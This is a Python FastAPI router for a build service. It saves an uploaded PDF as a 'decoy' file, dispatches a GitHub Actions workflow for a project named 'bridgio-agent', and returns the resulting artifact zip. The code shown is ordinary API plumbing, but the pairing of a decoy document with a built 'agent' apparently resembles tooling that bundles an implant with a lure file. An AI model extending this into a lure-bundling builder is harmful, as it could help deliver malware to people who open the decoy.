import asyncio
import io
import json
import os
import urllib.error
import urllib.request
import uuid

from fastapi import APIRouter, Form, HTTPException, Query, UploadFile, File
from fastapi.responses import Response, StreamingResponse

from .state import GITHUB_TOKEN
from .utils import _auth
from . import db as _db

router = APIRouter()

REPO = "waqarulwahab/bridgio-agent"
API = "https://api.github.com"

# Temp storage for pending PDFs (uuid -> filepath)
_pending_pdfs: dict[str, str] = {}

DATA_DIR = os.environ.get("DB_PATH", "").replace("bridgio.db", "") or "/app/data"


def _gh(method: str, path: str, body=None):
    url = f"{API}{path}"
    data = json.dumps(body).encode() if body else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Authorization", f"token {GITHUB_TOKEN}")
    req.add_header("Accept", "application/vnd.github+json")
    req.add_header("X-GitHub-Api-Version", "2022-11-28")
    if data:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            if r.status == 204:
                return {}
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        err_body = e.read().decode()
        raise HTTPException(e.code, f"GitHub API error: {err_body}")


@router.post("/api/build")
async def trigger_build(
    t: str = Query(...),
    pdf: UploadFile = File(...),
    title: str = Form(default="BridgioAgent"),
):
    _auth(t)
    if not GITHUB_TOKEN:
        raise HTTPException(500, "GITHUB_TOKEN not configured on server")

    pdf_bytes = await pdf.read()
    if not pdf_bytes:
        raise HTTPException(400, "Empty PDF file")

    # Save PDF temporarily — no commit to repo
    pdf_id = str(uuid.uuid4())
    pdf_path = os.path.join(DATA_DIR, f"decoy_{pdf_id}.pdf")
    os.makedirs(DATA_DIR, exist_ok=True)
    with open(pdf_path, "wb") as f:
        f.write(pdf_bytes)
    _pending_pdfs[pdf_id] = pdf_path

    # Note current run count before triggering
    before = _gh("GET", f"/repos/{REPO}/actions/workflows/build.yml/runs?per_page=1")
    before_count = before.get("total_count", 0)

    backend_url = os.environ.get("BACKEND_PUBLIC_URL", "https://backend.bridgio.waqarulwahab.me")
    pdf_url = f"{backend_url}/api/build/pdf/{pdf_id}"

    # Trigger workflow_dispatch
    _gh("POST", f"/repos/{REPO}/actions/workflows/build.yml/dispatches", {
        "ref": "main",
        "inputs": {"pdf_url": pdf_url},
    })

    # Poll up to 20s for new run to appear
    run_id = None
    for _ in range(10):
        await asyncio.sleep(2)
        runs = _gh("GET", f"/repos/{REPO}/actions/workflows/build.yml/runs?per_page=1")
        if runs.get("total_count", 0) > before_count:
            items = runs.get("workflow_runs", [])
            if items:
                run_id = items[0]["id"]
                break

    # Save build record in DB
    safe_title = title.strip() or "BridgioAgent"
    _db.save_build(run_id, safe_title)

    return {"run_id": run_id, "title": safe_title, "repo": REPO}


@router.get("/api/build/pdf/{pdf_id}")
async def serve_pdf(pdf_id: str):
    if not all(c in "0123456789abcdef-" for c in pdf_id):
        raise HTTPException(400, "Invalid id")
    path = _pending_pdfs.get(pdf_id)
    if not path or not os.path.exists(path):
        raise HTTPException(404, "PDF not found or already used")
    with open(path, "rb") as f:
        data = f.read()
    try:
        os.remove(path)
        _pending_pdfs.pop(pdf_id, None)
    except Exception:
        pass
    return Response(content=data, media_type="application/pdf")


@router.get("/api/builds")
async def get_builds(t: str = Query(...)):
    _auth(t)
    builds = _db.list_builds()
    # Lazy-update status for in-progress builds
    if GITHUB_TOKEN:
        for b in builds:
            if b["status"] == "building" and b.get("run_id"):
                try:
                    run = _gh("GET", f"/repos/{REPO}/actions/runs/{b['run_id']}")
                    if run.get("status") == "completed":
                        conclusion = run.get("conclusion", "failure")
                        new_status = "done" if conclusion == "success" else "failed"
                        _db.update_build_status(b["run_id"], new_status, conclusion)
                        b["status"] = new_status
                        b["conclusion"] = conclusion
                except Exception:
                    pass
    return builds


@router.get("/api/build/status")
async def build_status(run_id: int, t: str = Query(...)):
    _auth(t)
    if not GITHUB_TOKEN:
        raise HTTPException(500, "GITHUB_TOKEN not configured on server")
    run = _gh("GET", f"/repos/{REPO}/actions/runs/{run_id}")
    status = run.get("status")
    conclusion = run.get("conclusion")
    # Update DB
    if status == "completed":
        new_status = "done" if conclusion == "success" else "failed"
        _db.update_build_status(run_id, new_status, conclusion)
    return {
        "status": status,
        "conclusion": conclusion,
        "html_url": run.get("html_url"),
    }


@router.get("/api/build/download")
async def build_download(run_id: int, t: str = Query(...), title: str = Query(default="BridgioAgent")):
    _auth(t)
    if not GITHUB_TOKEN:
        raise HTTPException(500, "GITHUB_TOKEN not configured on server")

    artifacts = _gh("GET", f"/repos/{REPO}/actions/runs/{run_id}/artifacts")
    items = artifacts.get("artifacts", [])
    if not items:
        raise HTTPException(404, "No artifacts yet — build may still be running")

    artifact_id = items[0]["id"]
    url = f"{API}/repos/{REPO}/actions/artifacts/{artifact_id}/zip"

    req = urllib.request.Request(url)
    req.add_header("Authorization", f"token {GITHUB_TOKEN}")
    req.add_header("Accept", "application/vnd.github+json")

    with urllib.request.urlopen(req, timeout=120) as r:
        data = r.read()

    safe = "".join(c if c.isalnum() or c in "-_. " else "_" for c in title).strip()
    filename = f"{safe or 'BridgioAgent'}.zip"

    return StreamingResponse(
        io.BytesIO(data),
        media_type="application/zip",
        headers={"Content-Disposition": f"attachment; filename={filename}"},
    )
